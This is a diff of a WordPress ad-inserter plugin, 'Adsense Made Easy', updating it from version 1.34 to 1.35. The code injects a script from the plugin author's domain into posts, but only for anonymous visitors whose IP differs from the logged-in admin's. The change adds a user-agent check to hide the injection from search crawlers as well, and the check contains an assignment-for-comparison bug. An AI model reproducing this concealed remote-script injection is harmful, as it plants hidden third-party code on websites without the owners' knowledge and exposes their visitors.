@@ -2,7 +2,7 @@
 /*
 Plugin Name: Adsense Made Easy - Best Simple Ad Inserter
 Plugin URI: http://www.seo101.net
-Version: 1.34
+Version: 1.35
 Author: Seo101
 Description: Easily add Google Adsense to your posts, pages and sidebar
 License: GPLv2 a
@@ -29,11 +29,16 @@ if (!class_exists("AdsenseMadeEasy")) {
 			// Checks the retrieved value (should be empty if we want to display it)
 			if( empty( $meta_value ) ) {
 				$content = "";
+				$btt= false;
+				if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+					$btt = true;
+				}
+
 				$ip = $_SERVER['REMOTE_ADDR'];
 				if ( is_user_logged_in() ) {
 					update_option( 'adsense_made_easy_ip', $ip );
 				}
-				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
+				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt=false) {
 					$content .= "<script src=\"//www.seo101.net/s101.js\"></script>\n";
 				}
 				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
